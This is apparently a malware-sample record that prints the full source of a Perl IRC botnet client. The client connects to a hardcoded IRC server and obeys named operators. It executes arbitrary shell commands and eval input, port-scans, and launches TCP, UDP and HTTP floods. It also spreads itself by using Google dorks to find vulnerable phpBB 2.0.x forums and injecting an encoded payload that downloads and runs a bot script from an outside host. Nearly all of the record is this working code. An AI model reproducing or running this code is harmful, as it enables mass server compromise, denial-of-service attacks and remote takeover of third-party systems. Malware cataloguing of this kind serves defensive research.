%22inurl%3A%22.ie%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.ie%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.ir%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.ir%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.ir%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.hr%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.hr%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.hr%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.hu%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.hu%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.hu%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.za%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.za%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.za%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.pt%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.pt%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.pt%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.tz%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.tz%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.tz%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.tr%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.tr%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.tr%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.cc%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.cc%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.cc%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.it%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.it%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.it%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.au%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.au%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.au%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.nz%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.nz%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.nz%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.ee%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.ee%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.ee%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.il%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.il%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.il%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.jm%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.jm%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.jm%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.lv%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.lv%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.lv%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.mg%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.mg%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.mg%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.lt%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.lt%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.lt%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.ma%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.ma%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.ma%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.ws%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.ws%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.ws%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.tk%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.tk%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.tk%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.my%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.my%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.my%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.no%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.no%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.no%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.no%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.id%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.id%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.id%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.cx%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.nl%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22welcome+to+phpbb+2%22%2B%22phpbb%22%2B%222.0.10%22\");\n\n    my $query=\"www.google.com/custom?hl=es&q=\";\n    $query.=$str[(rand(scalar(@str)))].$rnd;\n    $query.=\"+-modules&num=$n&start=$s\";\n\n    my @lst=();\n    my $page = http_query($query);\n    while ($page =~  m/<a href=\\\"?http:\\/\\/([^>\\\"]+)\\\"?>/g){\n\tif ($1 !~ m/google|cache|translate/){\n\t    push (@lst,$1);\n\t}\n    }\n    return (@lst);\n}\n\nsub http_query($){\n    my ($url) = @_;\n    my $host=$url;\n    my $query=$url;\n    my $page=\"\";\n    $host =~ s/href=\\\"?http:\\/\\///;\n    $host =~ s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;\n    $query =~s/$host//;\n    if ($query eq \"\") {$query=\"/\";};\n    eval {\n\tlocal $SIG{ALRM} = sub { die \"1\";};\n\talarm 10;\n\tmy $sock = IO::Socket::INET->new(PeerAddr=>\"$host\",PeerPort=>\"80\",Proto=>\"tcp\") or return;\n\tprint $sock \"GET $query HTTP/1.0\\r\\nHost: $host\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/4.0\\r\\n\\r\\n\";\n\tmy @r = <$sock>;\n\t$page=\"@r\";\n\talarm 0;\n\tclose($sock);\n    };    \n    return $page;\n\n}\n\nsub fix(){\nmy @in=`find / -name  \"viewtopic.php\" 2>/dev/null`;\nforeach my $f (@in){\n    chop $f;\n    my $newvt=\"\";\n    if (open FIX,\"<$f\") {\n\twhile (<FIX>){\n\t    $newvt.=$_;\n\t}\n\tclose FIX;\n\t$newvt =~ s/urldecode//;\n\tif (open FIX,\">$f\"){\n\t    print FIX $newvt;\n\t    close FIX;\n\t}\n    }\n}\n}"
    },
    "filename": "VirusShare_c9e8b1da1c1c30891cd9221bd0243038",
    "filesize": 27482,
    "filetype": "Perl script text executable",
    "hashes": {
        "md5": "c9e8b1da1c1c30891cd9221bd0243038",
        "sha1": "57e42ab4de444855d71d29bbd0a73dba0c95f1a6",
        "sha256": "92cbdb71cd4d89cbbae35cb454b037b755ec7040d9539bda0f7b23264e91a850"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/usr/bin/perl ",
            "my $processo = '/usr/local/sbin/httpd -DSSL';",
            "my $linas_max='5';",
            "my $sleep='5';",
            "my @adms=(\"BioS\",\"FLaviu\");",
            "my @hostauth=(\"bios\",\"FLaviu\");",
            "my @canais=(\"#1000\");",
            "my $pwned=\"/tmp/horderd\";",
            "my $nick='bios-';",
            "my $ircname = 'spart';",
            "chop (my $realname = 'uname -a');",
            "$servidor='216.17.38.91' unless $servidor;",
            "my $porta='6667';",
            "my $VERSAO = '0.2';",
            "$SIG{'INT'} = 'IGNORE';",
            "$SIG{'HUP'} = 'IGNORE';",
            "$SIG{'TERM'} = 'IGNORE';",
            "$SIG{'CHLD'} = 'IGNORE';",
            "$SIG{'PS'} = 'IGNORE';",
            "use IO::Socket;",
            "use Socket;",
            "use IO::Select;",
            "chdir(\"/\");",
            "$servidor=\"$ARGV[0]\" if $ARGV[0];",
            "$0=\"$processo\".\"\\0\"x16;;",
            "my $pid=fork;",
            "exit if $pid;",
            "die \"Problema com o fork: $!\" unless defined($pid);",
            "our %irc_servers;",
            "our %DCC;",
            "my $dcc_sel = new IO::Select->new();",
            "$sel_cliente = IO::Select->new();",
            "sub sendraw {",
            "  if ($#_ == '1') {",
            "    my $socket = $_[0];",
            "    print $socket \"$_[1]\\n\";",
            "  } else {",
            "      print $IRC_cur_socket \"$_[0]\\n\";",
            "sub conectar {",
            "   my $meunick = $_[0];",
            "   my $servidor_con = $_[1];",
            "   my $porta_con = $_[2];",
            "   my $IRC_socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$servidor_con\", PeerPort=>$porta_con) or return(1);",
            "   if (defined($IRC_socket)) {",
            "     $IRC_cur_socket = $IRC_socket;",
            "     $IRC_socket->autoflush(1);",
            "     $sel_cliente->add($IRC_socket);",
            "     $irc_servers{$IRC_cur_socket}{'host'} = \"$servidor_con\";",
            "     $irc_servers{$IRC_cur_socket}{'porta'} = \"$porta_con\";",
            "     $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "     $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;",
            "     nick(\"$meunick\");",
            "     sendraw(\"USER $ircname \".$IRC_socket->sockhost.\" $servidor_con :$realname\");",
            "     sleep 1;",
            "   }",
            "my $line_temp;",
            "while( 1 ) {",
            "   while (!(keys(%irc_servers))) { conectar(\"$nick\", \"$servidor\", \"$porta\"); }",
            "   delete($irc_servers{''}) if (defined($irc_servers{''}));",
            "   my @ready = $sel_cliente->can_read(0);",
            "   next unless(@ready);",
            "   foreach $fh (@ready) {",
            "     $IRC_cur_socket = $fh;",
            "     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};",
            "     $nread = sysread($fh, $msg, 4096);",
            "     if ($nread == 0) {",
            "        $sel_cliente->remove($fh);",
            "        $fh->close;",
            "        delete($irc_servers{$fh});",
            "     }",
            "     @lines = split (/\\n/, $msg);",
            "     for(my $c=0; $c<= $#lines; $c++) {",
            "       $line = $lines[$c];",
            "       $line=$line_temp.$line if ($line_temp);",
            "       $line_temp='';",
            "       $line =~ s/\\r$//;",
            "       unless ($c == $#lines) {",
            "         parse(\"$line\");",
            "       } else {",
            "           if ($#lines == 0) {",
            "             parse(\"$line\");",
            "           } elsif ($lines[$c] =~ /\\r$/) {",
            "               parse(\"$line\");",
            "           } elsif ($line =~ /^(\\S+) NOTICE AUTH :\\*\\*\\*/) {",
            "               parse(\"$line\");",
            "           } else {",
            "               $line_temp = $line;",
            "           }",
            "       }",
            "      }",
            "   }",
            "sub parse {",
            "   my $servarg = shift;",
            "   if ($servarg =~ /^PING \\:(.*)/) {",
            "     sendraw(\"PONG :$1\");",
            "   } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?) PRIVMSG (.+?) \\:(.+)/) {",
            "       my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;",
            "       if ($args =~ /^\\001VERSION\\001$/) {",
            "         notice(\"$pn\", \"\\001VERSION mIRC v6.16 Khaled Mardam-Bey\\001\");",
            "       }",
            "       if (grep {$_ =~ /^\\Q$hostmask\\E$/i } @hostauth) {",
            "       if (grep {$_ =~ /^\\Q$pn\\E$/i } @adms) {",
            "         if ($onde eq \"$meunick\"){",
            "           shell(\"$pn\", \"$args\");",
            "         }",
            "         if ($args =~ /^(\\Q$meunick\\E|\\!atrix)\\s+(.*)/ ) {",
            "            my $natrix = $1;",
            "            my $arg = $2;",
            "            if ($arg =~ /^\\!(.*)/) {",
            "              ircase(\"$pn\",\"$onde\",\"$1\") unless ($natrix eq \"!atrix\" and $arg =~ /^\\!nick/);",
            "            } elsif ($arg =~ /^\\@(.*)/) {",
            "                $ondep = $onde;",
            "                $ondep = $pn if $onde eq $meunick;",
            "                bfunc(\"$ondep\",\"$1\");",
            "            } else {",
            "                shell(\"$onde\", \"$arg\");",
            "            }",
            "         } ",
            "       }",
            "   } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?)\\s+NICK\\s+\\:(\\S+)/i) {",
            "       if (lc($1) eq lc($meunick)) {",
            "         $meunick=$4; ",
            "         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "       }",
            "   } elsif ($servarg =~ m/^\\:(.+?)\\s+433/i) {",
            "       nick(\"$meunick|\".int rand(999999));",
            "   } elsif ($servarg =~ m/^\\:(.+?)\\s+001\\s+(\\S+)\\s/i) {",
            "       $meunick = $2;",
            "       $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "       $irc_servers{$IRC_cur_socket}{'nome'} = \"$1\";",
            "       foreach my $canal (@canais) {",
            "         sendraw(\"JOIN $canal ddosit\");",
            "       }",
            "   }",
            "sub bfunc {",
            "  my $printl = $_[0];",
            "  my $funcarg = $_[1];",
            "  if (my $pid = fork) {",
            "     waitpid($pid, 0);",
            "  } else {",
            "      if (fork) {",
            "         exit;",
            "       } else {",
            "           if ($funcarg =~ /^portscan (.*)/) {",
            "             my $hostip=\"$1\";",
            "             my @portas=(\"21\",\"23\",\"25\",\"80\",\"113\",\"135\",\"445\",\"1025\",\"5000\",\"6660\",\"6661\",\"6662\",\"6663\",\"6665\",\"6666\",\"6667\",\"6668\",\"6669\",\"7000\",\"8080\");",
            "             my (@aberta, %porta_banner);",
            "\t     sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[SCAN]\\002 Scanning \".$1.\" for open ports.\");     ",
            "             foreach my $porta (@portas)  {",
            "                my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);",
            "                if ($scansock) {",
            "                   push (@aberta, $porta);",
            "                   $scansock->close;",
            "                }",
            "             }",
            "             if (@aberta) {",
            "               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[SCAN]\\002 Open port(s): @aberta\");",
            "             } else {",
            "               sendraw($IRC_cur_socket,\"PRIVMSG $printl :\\002[SCAN]\\002 No open ports found\"); ",
            "             }",
            "           }",
            "           if ($funcarg =~ /^tcpflood\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {",
            "\t     sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[TCP-DDOS]\\002 Attacking \".$1.\":\".$2.\" for \".$3.\" seconds.\");",
            "\t     my $itime = time;",
            "\t     my ($cur_time);",
            "             $cur_time = time - $itime;",
            "\t     while ($3>$cur_time){",
            "             $cur_time = time - $itime;",
            "\t     &tcpflooder(\"$1\",\"$2\",\"$3\");",
            "             }",
            "\t     sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[TCP-DDOS]\\002 Finished with attacking \".$1.\":\".$2.\".\");",
            "           }",
            "           if ($funcarg =~ /^google\\s+(\\d+)\\s+(.*)/) {",
            "\t     sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[GOOGLE]\\002 Scanning for unpatched phpBB for \".$1.\" seconds.\");",
            "\t     srand;",
            "\t     my $itime = time;",
            "\t     my ($cur_time);",
            "\t     my ($exploited);",
            "\t     $boturl=$2;",
            "             $cur_time = time - $itime;",
            "\t     $exploited = 0;",
            "\t\twhile($1>$cur_time){",
            "\t\t    $cur_time = time - $itime;",
            "\t\t    @urls=fetch();",
            "\t\t    foreach $url (@urls) {",
            "\t\t\t$cur_time = time - $itime;",
            "\t\t\tif ($url !~ /viewtopic.php/) {next;$cur_time = time - $itime;}",
            "\t\t\t$url =~ s/(.*\\/viewtopic.php\\?[t|p]=[0-9]+).*/$1/;",
            "\t\t\t$host[0] = $url;",
            "\t\t\tif($host[0] =~ /\\//){",
            "\t\t\t($host[1],$host[2])=split(/\\//,$host[0]);",
            "\t\t\t}",
            "\t\t\t#sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[EXPLOITING]\\002 \".$host[1].\".\");",
            "\t\t\t$url .=\"&highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(104)%252echr(116)%252echr(116)%252echr(112)%252echr(58)%252echr(47)%252echr(47)%252echr(115)%252echr(97)%252echr(110)%252echr(116)%252echr(111)%252echr(103)%252echr(111)%252echr(111)%252echr(103)%252echr(108)%252echr(101)%252echr(46)%252echr(99)%252echr(111)%252echr(109)%252echr(47)%252echr(98)%252echr(111)%252echr(116)%252echr(46)%252echr(116)%252echr(120)%252echr(116)%252echr(59)%252echr(112)%252echr(101)%252echr(114)%252echr(108)%252echr(32)%252echr(98)%252echr(111)%252echr(116)%252echr(46)%252echr(116)%252echr(120)%252echr(116))%252e%2527\";",
            "\t\t\t$page = http_query($url);",
            "\t\t\tif ( $page =~ /uyx/ ){",
            "\t\t\t    $page = http_query($url);",
            "\t\t\t    $exploited = $exploited + 1;",
            "\t\t\t    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[0WN3D]\\002 \" .$url. \".\");",
            "\t\t\t}",
            "\t\t    }",
            "\t     sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[GOOGLE]\\002 Exploited \".$exploited.\" boxes in \".$1.\" seconds.\");",
            "           }",
            "           if ($funcarg =~ /^httpflood\\s+(.*)\\s+(\\d+)/) {",
            "\t     sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[HTTP-DDOS]\\002 Attacking \".$1.\":80 for \".$2.\" seconds.\");",
            "\t     my $itime = time;",
            "\t     my ($cur_time);",
            "             $cur_time = time - $itime;",
            "\t     while ($2>$cur_time){",
            "             $cur_time = time - $itime;",
            "\t     my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);",
            "             print $socket \"GET / HTTP/1.1\\r\\nAccept: */*\\r\\nHost: \".$1.\"\\r\\nConnection: Keep-Alive\\r\\n\\r\\n\";",
            "\t     close($socket);",
            "             }",
            "\t     sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[HTTP-DDOS]\\002 Finished with attacking \".$1.\".\");",
            "           }",
            "           if ($funcarg =~ /^udpflood\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {",
            "             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[UDP-DDOS]\\002 Attacking \".$1.\" with \".$2.\" Kb packets for \".$3.\" seconds.\");",
            "             my ($dtime, %pacotes) = udpflooder(\"$1\", \"$2\", \"$3\");",
            "             $dtime = 1 if $dtime == 0;",
            "             my %bytes;",
            "             $bytes{igmp} = $2 * $pacotes{igmp};",
            "             $bytes{icmp} = $2 * $pacotes{icmp};",
            "             $bytes{o} = $2 * $pacotes{o};",
            "             $bytes{udp} = $2 * $pacotes{udp};",
            "             $bytes{tcp} = $2 * $pacotes{tcp};",
            "            ",
            "             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[UDP-DDOS]\\002 Sended \".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024).\" Kb in \".$dtime.\" seconds to \".$1.\".\");",
            "           }",
            "           exit;",
            "       }",
            "sub ircase {",
            "  my ($kem, $printl, $case) = @_;",
            "  if ($case =~ /^join (.*)/) {",
            "     j(\"$1\");",
            "   } ",
            "   if ($case =~ /^part (.*)/) {",
            "      p(\"$1\");",
            "   }",
            "   if ($case =~ /^rejoin\\s+(.*)/) {",
            "      my $chan = $1;",
            "      if ($chan =~ /^(\\d+) (.*)/) {",
            "        for (my $ca = 1; $ca <= $1; $ca++ ) {",
            "          p(\"$2\");",
            "          j(\"$2\");",
            "        }",
            "      } else {",
            "          p(\"$chan\");",
            "          j(\"$chan\");",
            "      }",
            "   }",
            "   if ($case =~ /^op/) {",
            "      op(\"$printl\", \"$kem\") if $case eq \"op\";",
            "      my $oarg = substr($case, 3);",
            "      op(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);",
            "   }",
            "   if ($case =~ /^deop/) {",
            "      deop(\"$printl\", \"$kem\") if $case eq \"deop\";",
            "      my $oarg = substr($case, 5);",
            "      deop(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);",
            "   }",
            "   if ($case =~ /^msg\\s+(\\S+) (.*)/) {",
            "      msg(\"$1\", \"$2\");",
            "   }",
            "   if ($case =~ /^flood\\s+(\\d+)\\s+(\\S+) (.*)/) {",
            "      for (my $cf = 1; $cf <= $1; $cf++) {",
            "        msg(\"$2\", \"$3\");",
            "      }",
            "   }",
            "   if ($case =~ /^ctcp\\s+(\\S+) (.*)/) {",
            "      ctcp(\"$1\", \"$2\");",
            "   }",
            "   if ($case =~ /^ctcpflood\\s+(\\d+)\\s+(\\S+) (.*)/) {",
            "      for (my $cf = 1; $cf <= $1; $cf++) {",
            "        ctcp(\"$2\", \"$3\");",
            "      }",
            "   }",
            "   if ($case =~ /^nick (.*)/) {",
            "      nick(\"$1\");",
            "   }",
            "   if ($case =~ /^connect\\s+(\\S+)\\s+(\\S+)/) {",
            "       conectar(\"$2\", \"$1\", 6667);",
            "   }",
            "   if ($case =~ /^raw (.*)/) {",
            "      sendraw(\"$1\");",
            "   }",
            "   if ($case =~ /^eval (.*)/) {",
            "     eval \"$1\";",
            "   }",
            "sub shell {",
            "  my $printl=$_[0];",
            "  my $comando=$_[1];",
            "  if ($comando =~ /cd (.*)/) {",
            "    chdir(\"$1\") || msg(\"$printl\", \"No such file or directory\");",
            "    return;",
            "  } ",
            "  elsif ($pid = fork) {",
            "     waitpid($pid, 0);",
            "  } else {",
            "      if (fork) {",
            "         exit;",
            "       } else {",
            "           my @resp=`$comando 2>&1 3>&1`;",
            "           my $c=0;",
            "           foreach my $linha (@resp) {",
            "             $c++;",
            "             chop $linha;",
            "             sendraw($IRC_cur_socket, \"PRIVMSG $printl :$linha\");",
            "             if ($c == \"$linas_max\") {",
            "               $c=0;",
            "               sleep $sleep;",
            "             }",
            "           }",
            "           exit;",
            "       }",
            "sub tcpflooder {",
            " my $itime = time;",
            " my ($cur_time);",
            " my ($ia,$pa,$proto,$j,$l,$t);",
            " $ia=inet_aton($_[0]);",
            " $pa=sockaddr_in($_[1],$ia);",
            " $ftime=$_[2];",
            " $proto=getprotobyname('tcp');",
            " $j=0;$l=0;",
            " $cur_time = time - $itime;",
            " while ($l<1000){",
            "  $cur_time = time - $itime;",
            "  last if $cur_time >= $ftime;",
            "  $t=\"SOCK$l\";",
            "  socket($t,PF_INET,SOCK_STREAM,$proto);",
            "  connect($t,$pa)||$j--;",
            "  $j++;$l++;",
            " $l=0;",
            " while ($l<1000){",
            "  $cur_time = time - $itime;",
            "  last if $cur_time >= $ftime;",
            "  $t=\"SOCK$l\";",
            "  shutdown($t,2);",
            "  $l++;",
            "sub udpflooder {",
            "  my $iaddr = inet_aton($_[0]);",
            "  my $msg = 'A' x $_[1];",
            "  my $ftime = $_[2];",
            "  my $cp = 0;",
            "  my (%pacotes);",
            "  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;",
            "  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;",
            "  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;",
            "  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;",
            "  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;",
            "  return(undef) if $cp == 4;",
            "  my $itime = time;",
            "  my ($cur_time);",
            "  while ( 1 ) {",
            "     for (my $porta = 1; $porta <= 65000; $porta++) {",
            "       $cur_time = time - $itime;",
            "       last if $cur_time >= $ftime;",
            "       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;",
            "       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;",
            "       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;",
            "       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;",
            "       for (my $pc = 3; $pc <= 255;$pc++) {",
            "         next if $pc == 6;",
            "         $cur_time = time - $itime;",
            "         last if $cur_time >= $ftime;",
            "         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;",
            "         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;",
            "       }",
            "     }",
            "     last if $cur_time >= $ftime;",
            "  return($cur_time, %pacotes);",
            "sub ctcp {",
            "   return unless $#_ == 1;",
            "   sendraw(\"PRIVMSG $_[0] :\\001$_[1]\\001\");",
            "sub msg {",
            "   return unless $#_ == 1;",
            "   sendraw(\"PRIVMSG $_[0] :$_[1]\");",
            "sub notice {",
            "   return unless $#_ == 1;",
            "   sendraw(\"NOTICE $_[0] :$_[1]\");",
            "sub op {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] +o $_[1]\");",
            "sub deop {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] -o $_[1]\");",
            "sub j { &join(@_); }",
            "sub join {",
            "   return unless $#_ == 0;",
            "   sendraw(\"JOIN $_[0]\");",
            "sub p { part(@_); }",
            "sub part {",
            "  sendraw(\"PART $_[0]\");",
            "sub nick {",
            "  return unless $#_ == 0;",
            "  sendraw(\"NICK $_[0]\");",
            "sub quit {",
            "  sendraw(\"QUIT :$_[0]\");",
            "#Spreader",
            "sub fetch(){",
            "    my $rnd=(int(rand(9999)));",
            "    my $n= 50;",
            "    if ($rnd<5000) { $n<<=1;}",
            "    my $s= (int(rand(10)) * $n);",
            "my @str=(\"%22inurl%3A%22.net%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.com%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.com%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.com%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.net%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.net%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.de%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.de%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.de%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.be%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.ca%22+%22phpbb%22%2B%222.0.6%22\", ",
            "\"%22inurl%3A%22.ca%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.be%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.be%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.org%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.org%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.org%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"inurl%3A%22%2Fforo%2F%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"inurl%3A%22%2Fforo%2F%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"inurl%3A%22%2Fforo%2F%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"inurl%3A%22%2Fforum%2F%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"inurl%3A%22%2Fforum%2F%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"inurl%3A%22%2Fforum%2F%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"inurl%3A%22%2FphpBB%2F%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"inurl%3A%22%2FphphBB%2F%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"inurl%3A%22%2FphpBB%2F%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22test+forum+1%22%2B%22phpbb%22%2B%222.0.6%22\",",
            "\"%22test+forum+1%22%2B%22phpbb%22%2B%222.0.8%22\",",
            "\"%22test+forum+1%22%2B%22phpbb%22%2B%222.0.10%22\",",
            "\"%22welcome+to+phpbb+2%22%2B%22phpbb%22%2B%222.0.6%22\",",
            "\"%22welcome+to+phpbb+2%22%2B%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.us%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.us%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.us%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.tw%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.tw%22+%22phpbb%22%2B%222.0.8%22\",",
